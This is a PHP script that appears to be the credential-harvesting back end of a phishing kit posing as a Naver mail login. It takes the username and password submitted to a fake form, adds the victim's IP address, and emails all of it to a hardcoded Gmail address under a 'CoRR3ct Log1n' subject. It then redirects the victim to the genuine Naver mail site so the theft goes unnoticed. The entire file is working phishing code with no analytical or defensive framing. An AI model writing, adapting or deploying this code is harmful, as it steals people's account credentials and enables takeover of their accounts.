<?
$ip = getenv("REMOTE_ADDR");
$message .= "-----------  ! +Account infoS+ !  -----------\n";
$message .= "Username   : ".$_POST['id']."\n";
$message .= "Password   : ".$_POST['pw']."\n";
$message .= "IP Address : ".$ip."\n";
$message .= "-----------  !Thuglife_Legend+ !  -----------\n";
$send = "ghene.johnson@gmail.com";

$subject = "CoRR3ct Log1n $ip";
$headers = "From: N4V3R <info@notime.org>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
mail($send,$subject,$message,$headers);


header("Location: https://mail.naver.com/");
?>
